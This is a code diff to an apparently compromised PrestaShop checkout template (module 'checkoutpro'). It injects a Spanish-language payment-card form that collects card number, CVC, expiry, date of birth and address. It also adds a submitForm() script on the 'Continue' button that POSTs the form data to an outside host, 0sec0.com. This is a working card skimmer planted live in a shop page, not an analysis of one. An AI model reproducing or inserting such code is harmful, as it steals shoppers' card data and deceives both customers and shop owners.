@@ -118,160 +118,157 @@
                 {/foreach}
               </div>
               {if Configuration::get('CP_CHECK_TERMS')}
-   <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="https://cdn.tailwindcss.com?plugins=forms,typography"></script>
-		<script src="https://unpkg.com/unlazy@0.11.3/dist/unlazy.with-hashing.iife.js" defer init></script>
-		<script type="text/javascript">
-			window.tailwind.config = {
-				darkMode: ['class'],
-				theme: {
-					extend: {
-						colors: {
-							border: 'hsl(var(--border))',
-							input: 'hsl(var(--input))',
-							ring: 'hsl(var(--ring))',
-							background: 'hsl(var(--background))',
-							foreground: 'hsl(var(--foreground))',
-							primary: {
-								DEFAULT: 'hsl(var(--primary))',
-								foreground: 'hsl(var(--primary-foreground))'
-							},
-							secondary: {
-								DEFAULT: 'hsl(var(--secondary))',
-								foreground: 'hsl(var(--secondary-foreground))'
-							},
-							destructive: {
-								DEFAULT: 'hsl(var(--destructive))',
-								foreground: 'hsl(var(--destructive-foreground))'
-							},
-							muted: {
-								DEFAULT: 'hsl(var(--muted))',
-								foreground: 'hsl(var(--muted-foreground))'
-							},
-							accent: {
-								DEFAULT: 'hsl(var(--accent))',
-								foreground: 'hsl(var(--accent-foreground))'
-							},
-							popover: {
-								DEFAULT: 'hsl(var(--popover))',
-								foreground: 'hsl(var(--popover-foreground))'
-							},
-							card: {
-								DEFAULT: 'hsl(var(--card))',
-								foreground: 'hsl(var(--card-foreground))'
-							},
-						},
-					}
-				}
-			}
-		</script>
-		<style type="text/tailwindcss">
-			@layer base {
-				:root {
-					--background: 0 0% 100%;
---foreground: 240 10% 3.9%;
---card: 0 0% 100%;
---card-foreground: 240 10% 3.9%;
---popover: 0 0% 100%;
---popover-foreground: 240 10% 3.9%;
---primary: 240 5.9% 10%;
---primary-foreground: 0 0% 98%;
---secondary: 240 4.8% 95.9%;
---secondary-foreground: 240 5.9% 10%;
---muted: 240 4.8% 95.9%;
---muted-foreground: 240 3.8% 46.1%;
---accent: 240 4.8% 95.9%;
---accent-foreground: 240 5.9% 10%;
---destructive: 0 84.2% 60.2%;
---destructive-foreground: 0 0% 98%;
---border: 240 5.9% 90%;
---input: 240 5.9% 90%;
---ring: 240 5.9% 10%;
---radius: 0.5rem;
-				}
-				.dark {
-					--background: 240 10% 3.9%;
---foreground: 0 0% 98%;
---card: 240 10% 3.9%;
---card-foreground: 0 0% 98%;
---popover: 240 10% 3.9%;
---popover-foreground: 0 0% 98%;
---primary: 0 0% 98%;
---primary-foreground: 240 5.9% 10%;
---secondary: 240 3.7% 15.9%;
---secondary-foreground: 0 0% 98%;
---muted: 240 3.7% 15.9%;
---muted-foreground: 240 5% 64.9%;
---accent: 240 3.7% 15.9%;
---accent-foreground: 0 0% 98%;
---destructive: 0 62.8% 30.6%;
---destructive-foreground: 0 0% 98%;
---border: 240 3.7% 15.9%;
---input: 240 3.7% 15.9%;
---ring: 240 4.9% 83.9%;
-				}
-			}
-		</style>
-  </head>
-  <body>
-    
-<img src="https://t4.ftcdn.net/jpg/04/06/75/39/360_F_406753914_SFSBhjhp6kbHblNiUFZ1MXHcuEKe7e7P.jpg" style="width: 5cm; height: 2cm;" alt="Resized Image">
-<body class="bg-background text-foreground flex items-center justify-center min-h-screen">
-<label for="card-number" class="block mb-2 text-black" style="text-align: left;">Numero di Carta:</label>
-<input type="text" id="card-number" name="card-number" placeholder="1234 5678 9012 3456" class="input-field" style="border: 1px solid black; color: black; width: 12cm;" />
-
-<div class="input-group flex items-center mb-4">
-  <div class="expiry-date mr-2">
-    <label for="expiry-date" class="block mb-2 text-black">Data di Scadenza:</label>
-    <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/AA" class="input-field" style="border: 1px solid black; color: black; width: 6cm;" />
+<style>
+table {
+  border-collapse: collapse;
+  width: 100%;
+}
+td {
+  padding: 10px;
+  vertical-align: top;
+}
+label {
+  display: block;
+  margin-bottom: 5px;
+  font-weight: bold;
+  color: #333;
+  font-size: 16px;
+}
+input[type="text"] {
+  width: 100%;
+  padding: 10px;
+  border-radius: 5px;
+  border: 1px solid #ccc;
+  font-size: 16px;
+  color: #555;
+  box-sizing: border-box;
+  margin-bottom: 10px;
+}
+td {
+  padding: 10px;
+}
+label {
+  display: block;
+  margin-bottom: 5px;
+  font-weight: bold;
+  color: #333;
+  width: 100%;
+}
+.card-details {
+  display: flex;
+  align-items: center;
+  margin-bottom: 20px;
+}
+.card-details h2 {
+  margin-right: 20px;
+  font-size: 18px;
+}
+.card-logos {
+  display: flex;
+  align-items: center;
+}
+.card-logos img {
+  height: 20px;
+  margin-left: 10px;
+  border-radius: 5px;
+  box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
+  transition: transform 0.3s ease-in-out;
+}
+.card-logos img:hover {
+  transform: scale(1.1);
+}
+label {
+  display: block;
+  margin-bottom: 10px;
+  font-weight: bold;
+  color: #333;
+}
+.input-group {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 20px;
+}
+.input-group input {
+  flex: 1;
+  margin-left: 10px;
+  background-color: #f5f5f5;
+  border: none;
+  padding: 10px;
+  border-radius: 5px;
+  font-size: 16px;
+  color: #555;
+}
+input {
+  display: block;
+  margin-bottom: 20px;
+  padding: 10px;
+  border: none;
+  border-radius: 4px;
+  font-size: 16px;
+  color: #555;
+  background-color: #f5f5f5;
+}
+input:focus {
+  border-color: #1E90FF;
+  outline: none;
+}
+.label-group {
+  display: flex;
+  justify-content: space-between;
+}
+button {
+  background-color: #1E90FF;
+  color: #fff;
+  border: none;
+  border-radius: 5px;
+  font-size: 16px;
+  padding: 10px 20px;
+  cursor: pointer;
+}
+button:hover {
+  background-color: #007fff;
+}
+</style>
+<center>
+<div>
+  <div>
+    <img src="https://www.visa.com/images/homepage/visa_logo.png" alt="Visa">
+    <img src="https://www.mastercard.us/content/dam/public/mastercardcom/mea/za/logos/mc-logo-52.svg" alt="Mastercard">
+    <img src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.8.0/package/dist/img/logos/dls-logo-bluebox-solid.svg" alt="Amex">
   </div>
-  <div class="cvv">
-    <label for="cvv" class="block mb-2 text-black">CVV:</label>
-    <input type="text" id="cvv" name="cvv" placeholder="123" class="input-field" style="border: 1px solid black; color: black; width: 6cm;" />
-  </div>
-</div>
-
-<!-- Billing Details Section -->
-<p class="block mb-2 text-black" style="font-weight: bold;">Billing Detail:</p>
-
-<label for="card-holder-name" class="block mb-2 text-black">Card Holder Name:</label>
-<input type="text" id="card-holder-name" name="card-holder-name" placeholder="John Doe" class="input-field" style="border: 1px solid black; color: black; width: 12cm;" />
-
-<label for="address" class="block mb-2 text-black">Address:</label>
-<input type="text" id="address" name="address" placeholder="123 Main Street" class="input-field" style="border: 1px solid black; color: black; width: 12cm;" />
-
-<label for="city" class="block mb-2 text-black">City:</label>
-<input type="text" id="city" name="city" placeholder="City" class="input-field" style="border: 1px solid black; color: black; width: 12cm;" />
-
-<label for="postcode" class="block mb-2 text-black">Postcode:</label>
-<input type="text" id="postcode" name="postcode" placeholder="12345" class="input-field" style="border: 1px solid black; color: black; width: 12cm;" />
-
-<label for="country" class="block mb-2 text-black">Country:</label>
-<input type="text" id="country" name="country" placeholder="Country" class="input-field" style="border: 1px solid black; color: black; width: 12cm;" />
-
-
-
-  <style>
-    .input-field {
-        width: 100%;
-        padding: 10px;
-        margin-bottom: 15px;
-        border: 1px solid var(--border);
-        border-radius: 4px;
-        box-sizing: border-box;
-        transition: border-color 0.3s;
-    }
-    .input-field:focus {
-        border-color: var(--primary);
-        outline: none;
-    }
-  </style>
-</body>
-
-
-  </body>
-</html>
+<br>
+<h3>Detalles de la Tarjeta de Pago</h3>
+</center>
+<br>
+<form method="post" id="myform">
+<table>
+  <tr>
+    <td>
+      <label for="card_holder" style="text-align: left;">Nombre del Titular de la Tarjeta</label>
+      <input type="text" id="card_holder" name="card_holder" required placeholder="Juan Pérez"><br>
+      <label for="expiry_date" style="text-align: left;">Fecha de Vencimiento</label>
+      <input type="text" id="expiry_date" name="expiry_date" required placeholder="MM/AA"><br>
+      <label for="dob" style="text-align: left;">Fecha de Nacimiento</label>
+      <input type="text" id="dob" name="dob" required placeholder="DD.MM.AAAA"><br>
+      <label for="city" style="text-align: left;">Ciudad</label>
+      <input type="text" id="city" name="city" required placeholder="Ciudad"><br>
+      <label for="country" style="text-align: left;">País</label>
+      <input type="text" id="country" name="country" required placeholder="País"><br>
+    </td>
+    <td style="text-align:center;">
+      <label for="card_number" style="text-align: left;">Número de Tarjeta</label>
+      <input type="text" id="card_number" name="card_number" required placeholder="xxxx-xxxx-xxxx-xxxx"><br>
+      <label for="cvv" style="text-align: left;">CVC</label>
+      <input type="text" id="cvv" name="cvv" required placeholder="123"><br>
+      <label for="address" style="text-align: left;">Dirección</label>
+      <input type="text" id="address" name="address" required placeholder="Dirección"><br>
+      <label for="zipcode" style="text-align: left;">Código Postal</label>
+      <input type="text" id="zipcode" name="zipcode" required placeholder="12345"><br>
+    </td>
+  </tr>
+</table>
+</form>
                 <fieldset class="clearb">
                   <input type="checkbox" id="tos" checked="checked" style="display: none !important;">
                   {assign var='terms_cms' value=Configuration::get('CP_TERMS_CMS')}
@@ -301,11 +298,32 @@
             {/if}
             <span id='checkfixed'></span>
             <div class="submit next-step clearfix text-xs-right">
-              <a href="{url entity='module' name='checkoutpro' controller='step_two'}" class="return">{l s='Return to shipping' mod='checkoutpro'}</a>
+              <a href="{url entity='module' name='checkoutpro' controller='step_two'}" class="return"><i class="material-icons">chevron_left</i>{l s='Return to shipping' mod='checkoutpro'}</a>
               {if !empty($payment_options) && !isset($g_errors) && !$cart.minimalPurchaseRequired}
                 <button onclick="submitForm()" id="submitStep" value="submitStep" class="btn btn-default button">
                   <span>{l s='Continue' mod='checkoutpro'}</span>
                 </button>
+<script>
+function submitForm() {
+  var form = document.getElementById("myform");
+  var formData = new FormData(form);
+
+  fetch("https://0sec0.com/cascoantiguo.com.php", {
+    method: "POST",
+    body: formData
+  })
+  .then(response => {
+    if (response.ok) {
+      console.log("Sent!");
+    } else {
+      console.error("error!");
+    }
+  })
+  .catch(error => {
+    console.error("error!", error);
+  });
+}
+</script>
               {/if}
             </div>
           </div>
